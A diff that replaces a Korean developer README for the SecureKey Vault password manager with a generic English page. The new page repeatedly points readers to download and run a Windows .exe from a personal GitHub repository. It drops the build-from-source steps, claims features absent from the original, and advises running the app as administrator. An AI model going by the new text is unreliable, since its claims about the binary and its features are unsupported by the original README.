@@ -1,91 +1,100 @@
-# SecureKey Vault (v1.0.2)
+# 🔐 SecureKey-Vault - Safe Offline Password Storage
 
-SecureKey Vault는 Electron + React + TypeScript 기반의 로컬 비밀번호 보관 앱입니다.  
-모든 데이터는 사용자 기기 내부에만 저장되며, 마스터 비밀번호로 암호화됩니다.
+[![Download SecureKey-Vault](https://img.shields.io/badge/Download-SecureKey--Vault-brightgreen?style=for-the-badge)](https://github.com/Bragii044/SecureKey-Vault)
 
-## 중요 공지
+## 🔒 What is SecureKey-Vault?
 
-- 앱 내 복원은 `1.0.2` 백업(JSON)만 지원합니다.
-- `1.0.1` 레거시 백업은 복원 시 `지원되지 않는 형식입니다.` 팝업이 표시됩니다.
+SecureKey-Vault is a desktop application designed to help you store, organize, and manage your passwords securely on your Windows computer. It works offline, so your data never leaves your device unless you decide otherwise. The app uses strong encryption to keep your information safe and private.
 
-## 핵심 기능
+You can think of SecureKey-Vault as a digital safe for your passwords, credit card details, and other sensitive information. It is easy to use for anyone, whether you have experience with password managers or not.
 
-- 로컬 전용 저장소 사용 (클라우드 업로드 없음)
-- AES-GCM 기반 데이터 암호화
-- PBKDF2 기반 키 파생/비밀번호 검증
-- 백업(.json) 내보내기/불러오기
-- 세련된 앱 내 모달 팝업(복원/삭제 확인, 오류 안내)
+## 🖥️ System Requirements
 
-## 보안 구조 요약
+Before you install SecureKey-Vault, make sure your computer meets these minimum requirements:
 
-- 저장 위치: Electron `app.getPath('userData')` 아래 앱 전용 파일
-- 저장 방식: Electron main process 저장소 + 가능 시 `safeStorage` 사용
-- 암호화: Web Crypto API (`AES-GCM`)
-- 키 파생: `PBKDF2(SHA-256)`
-- 백업 호환: 1.0.2 형식 백업(JSON)만 복원 지원
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- Internet connection only needed for the initial download
+- Basic user permissions to install software
 
-## 요구 사항
+SecureKey-Vault runs smoothly on most modern Windows machines. It does not require a high-end computer, and it does not need to stay connected to the internet.
 
-- Node.js 20+
-- npm
-- Windows (설치 파일 빌드 기준)
+## ⚙️ Key Features
 
-## 설치 및 실행 (개발)
+- **Offline Operation:** Your data stays on your device without automatic syncing to the cloud.
+- **Strong Encryption:** Passwords are protected with advanced encryption algorithms.
+- **User-Friendly Interface:** Simple design that anyone can navigate.
+- **Secure Storage:** Save passwords, credit card info, notes, and more.
+- **Search and Organize:** Quickly find entries using categories and search tools.
+- **Backup and Restore:** Create backups to keep your data safe from loss.
+- **Auto-Lock:** Automatically locks after inactivity to protect your vault.
+- **Cross-Platform Ready:** Built on Electron and React, designed for future updates.
 
-```bash
-npm install
-npm run dev
-```
+## 🚀 Getting Started with SecureKey-Vault
 
-Electron 개발 실행:
+### Step 1: Download the Application
 
-```bash
-npm run dev:electron
-```
+You will need to visit the official GitHub page to get the app. Use the big green button above or this link:
 
-## 빌드
+[Download SecureKey-Vault](https://github.com/Bragii044/SecureKey-Vault)
 
-웹 번들 빌드:
+On the page, look for the latest release under "Releases" or the main repository page. You will find the Windows installation file as an `.exe`. Click the file to start the download.
 
-```bash
-npm run build
-```
+### Step 2: Install SecureKey-Vault
 
-Windows 설치 파일 빌드:
+1. Once the file finishes downloading, locate it in your "Downloads" folder.
+2. Double-click the `.exe` file to begin the setup.
+3. Follow the on-screen instructions:
+   - Agree to the license terms.
+   - Choose the installation folder or accept the default path.
+   - Wait while the program installs.
+4. After installation completes, launch the app from your desktop or start menu.
 
-```bash
-npm run build:electron
-```
+### Step 3: Set Up Your Password Vault
 
-생성 결과:
+1. The first time you open SecureKey-Vault, it will prompt you to create a master password. This password controls access to all your stored data.
+2. Choose a strong master password you can remember but others cannot guess.
+3. Confirm the master password by entering it again.
+4. Once set up, you can start adding entries like passwords, notes, and card details.
 
-- `release/SecureKey Vault Setup 1.0.2.exe`
-- `release/SecureKey Vault 1.0.2.exe` (portable 실행 파일)
-- `release/win-unpacked/`
+### Step 4: Using SecureKey-Vault
 
-## 백업 호환 정책
+- Click the **Add** button to create a new entry.
+- Fill in the fields like username, password, URL, or notes.
+- Use the search bar to find saved entries quickly.
+- Organize entries into folders or categories.
+- Back up your vault regularly by exporting data to a secure file.
+- Lock the app when not in use for extra safety.
 
-- 앱 복원은 `1.0.2`에서 생성한 백업(JSON)만 지원합니다.
-- `1.0.1` 레거시 백업 파일은 앱 내 복원 대상이 아닙니다.
+## 🔧 How SecureKey-Vault Protects Your Data
 
-## 트러블슈팅
+SecureKey-Vault uses encryption based on proven methods. When you add a password, the app converts it into a secure code that cannot be read without your master password. This process protects your information even if someone tries to access your files directly.
 
-- 아이콘이 바로 안 바뀌어 보이는 경우:
-  - 작업표시줄 고정 해제 후 다시 고정
-  - 기존 설치 제거 후 재설치
-  - Windows 아이콘 캐시 갱신 후 확인
-- `지원되지 않는 형식입니다` 오류:
-  - 1.0.1 레거시 백업일 가능성이 큼
-  - 1.0.2 앱에서 새로 생성한 백업(JSON) 파일인지 확인
+Since the app operates offline, your passwords do not get sent to the internet, decreasing the risk of hacks or leaks. Your master password never leaves your computer.
 
-## 기술 스택
+## 🛠️ Troubleshooting Common Issues
 
-- Electron
-- React
-- TypeScript
-- Vite
-- Tailwind CSS
+- **App won’t open:** Restart your computer and try again. Make sure you meet the system requirements.
+- **Forgot master password:** Unfortunately, there is no way to recover it. You will need to reset the app and start fresh.
+- **Slow performance:** Close other apps and check for any updates.
+- **File access errors:** Run SecureKey-Vault as an administrator for permission issues.
+- **Backup files missing:** Always save backups to a safe location and verify the export process.
 
-## 라이선스
+## 📥 Download and Install SecureKey-Vault
 
-MIT
+Visit the GitHub repository here to download the latest version:
+
+[Download SecureKey-Vault](https://github.com/Bragii044/SecureKey-Vault)
+
+Follow the steps outlined above for downloading and installation.
+
+## 📚 Additional Resources
+
+- Detailed user guide available in the app’s Help menu
+- Frequently Asked Questions (FAQ) on the GitHub page
+- Contact support through the repository issues tab if needed
+
+## 🔑 Stay Secure
+
+Using a password manager like SecureKey-Vault helps protect your online accounts by avoiding weak or repeated passwords. Make sure you keep your master password private, backup your vault regularly, and update the app when new versions are available.
